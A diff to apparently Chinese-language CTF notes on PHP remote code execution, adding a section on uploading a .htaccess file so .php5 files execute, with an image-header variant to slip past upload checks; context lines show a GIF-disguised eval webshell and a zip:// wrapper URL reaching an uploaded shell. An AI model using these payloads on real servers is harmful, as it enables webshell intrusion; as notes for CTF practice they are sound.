@@ -10,8 +10,6 @@ PHP是世界上最好的语言，这是在2010年前适用的一句话。
 $$args，变量泄漏 _REQUEST\_SERVER\GLOBALS
 ```
 
-
-
 ## PHP RCE
 
 如果有执行 php 代码的入口，通常需要掌握哪些函数能够获取文件内容或更多内部信息，同时要掌握绕过 安全狗 / WAF 的技巧。
@@ -120,6 +118,22 @@ GIF89a
 <?php eval($_POST['cmd']); ?>
 ```
 
+### 打开执行限制
+
+有些 PHP 的环境，限制了允许执行的后缀类型，如仅允许 `php` 后缀执行，不允许 `php5` 后缀执行。并且上传校验限制了上传 `php` 但没限制 `php5`。如果可以上传 `.htaccess` 文件，可以尝试打开执行限制。
+
+```.htaccess
+AddType application/x-httpd-php .php5
+```
+
+```.htaccess
+#define width 16
+#define height 7
+<FilesMatch "\.php5$">
+ SetHandler application/x-httpd-php 
+</FilesMatch> 
+```
+
 ### 访问绕过
 
 有的题目，不允许直接访问PHP后缀的文件，可以通过 zip 伪协议方式访问 zip 包中的代码。
@@ -128,4 +142,5 @@ GIF89a
 $ http://103.213.97.75:53587/?file=zip:///var/www/html/upload/a.jpg%23shell.php
 ```
 
-
+## 参考资料
+1. https://www.cnblogs.com/20175211lyz/p/11741348.html
